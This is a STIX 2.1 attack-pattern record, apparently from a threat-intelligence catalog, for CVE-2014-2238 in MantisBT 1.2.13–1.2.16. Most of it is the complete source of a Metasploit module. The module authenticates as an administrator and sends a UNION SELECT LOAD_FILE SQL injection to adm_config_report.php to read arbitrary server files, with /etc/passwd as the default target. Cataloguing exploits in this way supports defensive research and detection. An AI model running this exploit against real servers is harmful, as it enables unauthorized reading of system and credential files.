{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d4e0caf8-e55d-48e6-b4f4-b5e59dd778c1",
    "created": "2024-08-14T16:31:26.037461Z",
    "modified": "2024-08-14T16:31:26.037465Z",
    "name": "\"MantisBT Admin SQL Injection Arbitrary File Read\"",
    "description": " Versions 1.2.13 through 1.2.16 are vulnerable to a SQL injection attack if an attacker can gain access to administrative credentials.  This vuln was fixed in 1.2.17.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/mantisbt_admin_sqli.rb",
            "external_id": "mantisbt_admin_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2238"
        },
        {
            "source_name": "reference",
            "url": "https://www.mantisbt.org/bugs/view.php?id=17055"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MantisBT Admin SQL Injection Arbitrary File Read\",\n      'Description'    => %q{\n      Versions 1.2.13 through 1.2.16 are vulnerable to a SQL injection attack if\n      an attacker can gain access to administrative credentials.\n\n      This vuln was fixed in 1.2.17.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jakub Galczyk', #initial discovery\n          'Brandon Perry <bperry.volatile[at]gmail.com>' #meatpistol module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2014-2238'],\n          ['URL', 'https://www.mantisbt.org/bugs/view.php?id=17055']\n        ],\n      'Platform'       => ['win', 'linux'],\n      'Privileged'     => false,\n      'DisclosureDate' => '2014-02-28'))\n\n      register_options(\n      [\n        OptString.new('FILEPATH', [ true, 'Path to remote file', '/etc/passwd']),\n        OptString.new('USERNAME', [ true, 'Single username', 'administrator']),\n        OptString.new('PASSWORD', [ true, 'Single password', 'root']),\n        OptString.new('TARGETURI', [ true, 'Relative URI of MantisBT installation', '/'])\n      ])\n\n  end\n\n  def run\n    post = {\n      'return' => 'index.php',\n      'username' => datastore['USERNAME'],\n      'password' => datastore['PASSWORD'],\n      'secure_session' => 'on'\n    }\n\n    resp = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/login.php'),\n      'method' => 'POST',\n      'vars_post' => post\n    })\n\n    if !resp or !resp.body\n      fail_with(Failure::UnexpectedReply, \"Error in server response. Ensure the server IP is correct.\")\n    end\n\n    cookie = resp.get_cookies\n\n    if cookie == ''\n      fail_with(Failure::NoAccess, \"Authentication failed\")\n    end\n\n    filepath = datastore['FILEPATH'].unpack(\"H*\")[0]\n\n    payload = \"save=1&filter_user_id=0&filter_project_id=0&filter_config_id=-7856%27\"\n    payload << \"+UNION+ALL+SELECT+11%2C11%2C11%2C11%2CCONCAT%280x71676a7571%2CIFNULL%28CAST%28HEX%28LOAD_FILE\"\n    payload << \"%280x#{filepath}%29%29+AS+CHAR%29%2C0x20%29%2C0x7169727071%29%2C11%23&apply_filter_button=Apply+Filter\"\n\n    resp = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/adm_config_report.php'),\n      'method' => 'POST',\n      'data' => payload,\n      'cookie' => cookie,\n    })\n\n    if !resp or !resp.body\n      fail_with(Failure::UnexpectedReply, \"Error in server response\")\n    end\n\n    # qgjuq is prepended to the result of the sql injection\n    # qirpq is appended to the result of the sql injection\n    # This allows the use of a simple regex to grab the contents\n    # of the file easily from the page source.\n    file = /qgjuq(.*)qirpq/.match(resp.body)\n\n    file = file[0].gsub('qgjuq', '').gsub('qirpq', '')\n    file = [file].pack(\"H*\")\n\n    path = store_loot(\"mantisbt.file\", \"text/plain\", datastore['RHOST'], file, datastore['FILEPATH'])\n\n    if path and path != ''\n      print_good(\"File saved to: #{path}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-28",
    "x_mitre_platforms": [
        "['win', 'linux']"
    ]
}